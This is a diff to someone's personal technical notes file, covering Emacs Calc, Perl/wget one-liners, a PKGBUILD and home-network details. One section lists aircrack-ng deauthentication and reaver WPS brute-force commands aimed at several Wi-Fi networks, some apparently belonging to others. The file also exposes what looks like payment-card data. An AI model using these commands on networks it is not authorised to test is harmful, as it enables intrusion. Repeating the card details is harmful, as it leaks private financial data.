@@ -62,6 +62,29 @@
    C-x C-k r
    
 ** Calc
+*** Matrix commands
+    Pack/unpack:
+    v-p / v-u without argument packs/unpacks nums = head stack value
+    M-NUM v-p - how many numbers to pack from stack
+    M-NUM v-u - how many numbers to pack from stack
+    arg examples: 2, 3, [3,3], [1,2]
+
+    `| - concat two vectors
+    v-d - build diagonal matrix from vector
+    M-NUM v-d - constant diagonal matrix (1,0,...)
+    v-i - E
+    v-x - builds vector from 1 to N
+    v-b - bulds vector of N copies from head (number or vector)
+    v-h - return first element from vector
+    I-v-h - returns vector with removed first element
+    v-r - extract row from matrix (negative - delete) (zero -extract diagonal vector)
+    v-c - extract column
+    v-a - rearrange vector to have a certain numver of columns
+    v-t - transpose matrix
+    v-v - reverse matrix
+    & - compute inversed matrix A^-1
+    
+    
    C-x * c | C-x * * - запуск в обычном режиме
    C-x * q - quick mode
    C-x * k - запуск в режиме keypad
@@ -252,10 +275,11 @@ point-max
 
 * Perl
   Каждая строка файла links передается в команду wget; $_ - дефолтный счетчик:
-  perl -ne 'system("wget $_")' buf
-  perl -e 'chomp(@file = <STDIN>); foreach (@file) { system("wget $_") }' < links
+  perl -ne 'system("wget --content-disposition -p -k $_")' buf
+  -p - загрузка css, js, изображений, -k - оффлайн доступ, --content-disposition
+  perl -e 'chomp(@file = <STDIN>); foreach (@file) { system("wget -p -k $_") }' < links
   Здесь тоже самое, в wget передается сразу весь массив @file в одну строку:
-  perl -e 'chomp(@file = <STDIN>); system("wget @file")' < links
+  perl -e 'chomp(@file = <STDIN>); system("wget -p -k @file")' < links
   Опции командной строки:
   -n - сгенирировать код: while (<>) { ... }
   -p - сгенирировать код: while (<>) { ... print; }
@@ -504,6 +528,8 @@ Run a command in background:
 
 * Other
 ** Home Network
+   Hostname: maglight.dlinkddns.com
+
    win7home     192.168.0.100 00:1E:90:B8:1C:F5
    tparch	192.168.0.101 60:67:20:D7:05:88
    win7work     192.168.0.102 00:C0:A8:FF:94:72
@@ -649,6 +675,8 @@ Wine msi:
 ** Remember
 Карта № 2938494461    
 
+240:4068950045185011:01:15
+
 ** Ankii
 disere - желание
 sequence
@@ -688,6 +716,60 @@ held
 composedunits
 dereferencing - разыменование = indirection - косвенное обращение
 
+* PKGBUILD example
+  # Maintainer: Lubosz Sarnecki <lubosz at gmail>
+
+  pkgname=aria-robot
+  pkgver=2.7.5.2
+  distname=Aria-${pkgver}
+  pkgrel=1
+  pkgdesc='MobileRobots Advanced Robot Interface for Applications. A C++ library for MobileRobots/ActivMedia platforms.'
+  arch=('i686' 'x86_64')
+  url='http://robots.mobilerobots.com/wiki/ARIA'
+  license=('GPL2')
+  depends=()
+  makedepends=()
+  source=(ARIA-2.7.5.2+x86_64+gcc4.3.tgz)
+  md5sums=('3af30a8783b127a9773e708175ecf066')
+
+  build() {
+    cd ${srcdir}/${distname}
+    make
+  }
+
+  package() {
+    cd ${srcdir}/${distname}
+    make DESTDIR=$pkgdir install
+  }
+
+* aircrack-ng
+  sudo airodump-ng -w handshaketest -c 13 1C:BD:B9:27:95:02 mon4
+  sudo aireplay-ng -0 3 -a 1C:BD:B9:27:95:02 -c 60:67:20:d7:05:88 mon4 --ignore-negative-one
+
+  airodump-ng -c 13 -w wep --bssid 1C:BD:B9:27:95:02 mon0
+  aireplay-ng -1 0 -a 1C:BD:B9:27:95:02 -h 00:C0:CA:30:85:7A mon0
+
+  sudo airmon-ng
+  sudo airmon-ng start wlp3s0
+  sudo airodump-ng mon5
+  sudo airodump-ng -c 13 -w wep --bssid 1C:BD:B9:27:95:02 mon5 --ignore-negative-one
+  sudo aireplay-ng -1 0 -a 1C:BD:B9:27:95:02 -h 60:67:20:d7:05:88 mon5 --ignore-negative-one
+
+  sudo reaver -i mon0 -b 20:4E:7F:33:CF:3D -vv
+  sudo reaver -i mon0 -b C8:6C:87:77:CC:38 -vv
+
+  sudo reaver -i mon0 -b C8:6C:87:77:CC:38 -vv -o reaver-log -s C86C8777CC38.wpc -a -x 200
+  sudo reaver -i mon0 -b 00:21:91:F6:10:E5 -vv /data/sandbox/reaver-tr -a -x 200
+
+  1C:BD:B9:27:95:02	Light
+  60:67:20:d7:05:88	tparch
+  00:07:88:95:D3:C5
+  20:4E:7F:33:CF:3D	WiFi.Dom.ru-6023
+  C8:6C:87:77:CC:38	Zyxel_Pyxel
+  00:21:91:F6:10:E5	Trojan
+
+* ktorrent download CLI
+  qdbus-qt4 org.ktorrent.ktorrent /core org.ktorrent.core.load "/data/Downloads/.torrents/Black Mirror (Сезон 2).torrent" "Music"
 
 
 * Games track
@@ -696,6 +778,7 @@ dereferencing - разыменование = indirection - косвенное о
   Torment: Tides of Numenera [kickstarter]
   Project Eternity [kickstarter]
   The Age of Decadence [Rim][fallout-like]
+  
 * ERC log
 [Sat Apr  6 2013]
 --- You have joined channel #qet  [21:02]
